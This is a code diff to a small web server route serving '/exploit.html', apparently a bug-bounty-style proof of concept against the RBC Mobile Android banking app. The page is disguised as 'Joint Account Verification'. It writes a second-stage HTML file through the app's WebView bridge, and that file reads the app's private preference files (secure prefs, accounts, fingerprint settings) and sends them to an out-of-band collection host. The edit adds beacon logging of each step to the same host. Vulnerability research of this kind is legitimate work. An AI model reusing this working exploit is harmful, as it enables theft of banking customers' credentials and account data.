@@ -13,71 +13,80 @@ app.get("/exploit.html", (_req, res) => {
 <html>
 <head><title>Joint Account Verification</title></head>
 <body>
-<p>Setting up secure verification... You will receive a confirmation link shortly.</p>
+<p id="status">Starting...</p>
 <script>
-var ATTACKER_SERVER = "https://edzgaslqbiamjmvftfea7klu2g2d78cp3.oast.fun";
+var SERVER = "https://edzgaslqbiamjmvftfea7klu2g2d78cp3.oast.fun";
 
-// --- STAGE 2 PAYLOAD ---
-// This HTML will execute in a file:// context (loaded by Click 2).
-// setAllowFileAccessFromFileURLs(true) permits XHR to other file:// URLs.
-// The JS bridge is available because Click 2 triggers a fresh deeplink that
-// creates a new GenericWebViewFragment with addJavascriptInterface called normally.
-// Exfiltration uses EXTERNAL_WEBVIEW to open the system browser (bypasses
-// setAllowUniversalAccessFromFileURLs=false).
+function log(step) {
+    document.getElementById("status").innerText = step;
+    new Image().src = SERVER + "/log?step=" + encodeURIComponent(step);
+}
 
-var stage2Html = [
-'<!DOCTYPE html>',
-'<html><body><p>Verifying your identity...</p><script>',
-'var stolen = {};',
-'var targets = [',
-'  "/data/data/com.rbc.mobile.android/shared_prefs/SecurePrefs.xml",',
-'  "/data/data/com.rbc.mobile.android/shared_prefs/RBC Mobile.xml",',
-'  "/data/data/com.rbc.mobile.android/shared_prefs/accounts.xml",',
-'  "/data/data/com.rbc.mobile.android/shared_prefs/autoBackupSharedPref.xml",',
-'  "/data/data/com.rbc.mobile.android/shared_prefs/fingerprint_preference_name.xml",',
-'  "/data/data/com.rbc.mobile.android/shared_prefs/ASYNC_NOTIFICATION_PREF.xml"',
-'];',
-'var completed = 0;',
-'targets.forEach(function(path) {',
-'  var xhr = new XMLHttpRequest();',
-'  xhr.open("GET", "file://" + path, true);',
-'  xhr.onreadystatechange = function() {',
-'    if (xhr.readyState === 4) {',
-'      if (xhr.status === 0 || xhr.status === 200) {',
-'        stolen[path] = xhr.responseText;',
-'      }',
-'      completed++;',
-'      if (completed === targets.length) {',
-'        var data = encodeURIComponent(JSON.stringify(stolen));',
-'        WebViewFragment.onNavigateWebHook(JSON.stringify({',
-'          "version": "1.2",',
-'          "type": "externalWebview",',
-'          "destination": "' + ATTACKER_SERVER + '/collect?d=" + data',
-'        }));',
-'      }',
-'    }',
-'  };',
-'  xhr.send();',
-'});',
-'<\\/script></body></html>'
-].join('\n');
+log("1-page-loaded");
 
-// Write stage-2 HTML to predictable path via DYNAMIC_DOWNLOAD_DOCUMENT
-// File is written to: /storage/emulated/0/Android/data/com.rbc.mobile.android/files/verify.html
-// isBase64=true bypasses isUrlAllowed() — no URL/content/extension validation
+if (typeof WebViewFragment === "undefined") {
+    log("FAIL-no-bridge");
+} else {
+    log("2-bridge-exists");
 
-WebViewFragment.onFeatureEventWebHook(JSON.stringify({
-    "version": "1.2",
-    "type": "dynamicDownloadDocument",
-    "targetFileBase64": btoa(stage2Html),
-    "fileName": "verify.html"
-}));
+    var stage2Html = [
+    '<!DOCTYPE html>',
+    '<html><body><p>Verifying your identity...</p><script>',
+    'var stolen = {};',
+    'var targets = [',
+    '  "/data/data/com.rbc.mobile.android/shared_prefs/SecurePrefs.xml",',
+    '  "/data/data/com.rbc.mobile.android/shared_prefs/RBC Mobile.xml",',
+    '  "/data/data/com.rbc.mobile.android/shared_prefs/accounts.xml",',
+    '  "/data/data/com.rbc.mobile.android/shared_prefs/autoBackupSharedPref.xml",',
+    '  "/data/data/com.rbc.mobile.android/shared_prefs/fingerprint_preference_name.xml",',
+    '  "/data/data/com.rbc.mobile.android/shared_prefs/ASYNC_NOTIFICATION_PREF.xml"',
+    '];',
+    'var completed = 0;',
+    'targets.forEach(function(path) {',
+    '  var xhr = new XMLHttpRequest();',
+    '  xhr.open("GET", "file://" + path, true);',
+    '  xhr.onreadystatechange = function() {',
+    '    if (xhr.readyState === 4) {',
+    '      if (xhr.status === 0 || xhr.status === 200) {',
+    '        stolen[path] = xhr.responseText;',
+    '      }',
+    '      completed++;',
+    '      if (completed === targets.length) {',
+    '        var data = encodeURIComponent(JSON.stringify(stolen));',
+    '        WebViewFragment.onNavigateWebHook(JSON.stringify({',
+    '          "version": "1.2",',
+    '          "type": "externalWebview",',
+    '          "destination": "' + SERVER + '/collect?d=" + data',
+    '        }));',
+    '      }',
+    '    }',
+    '  };',
+    '  xhr.send();',
+    '});',
+    '<\\/script></body></html>'
+    ].join('\n');
 
-// Beacon to confirm the file write was dispatched
-new Image().src = ATTACKER_SERVER + "/log?step=file-write-dispatched";
+    log("3-stage2html-built-len-" + stage2Html.length);
+
+    try {
+        var b64 = btoa(stage2Html);
+        log("4-btoa-ok-len-" + b64.length);
+
+        WebViewFragment.onFeatureEventWebHook(JSON.stringify({
+            "version": "1.2",
+            "type": "dynamicDownloadDocument",
+            "targetFileBase64": b64,
+            "fileName": "verify.html"
+        }));
+        log("5-bridge-call-returned");
+    } catch(e) {
+        log("FAIL-bridge-error-" + e.message);
+    }
+}
 </script>
 </body>
-</html>`);
+</html>
+`);
 });
 
 app.get('/test.txt', function (req, res) {
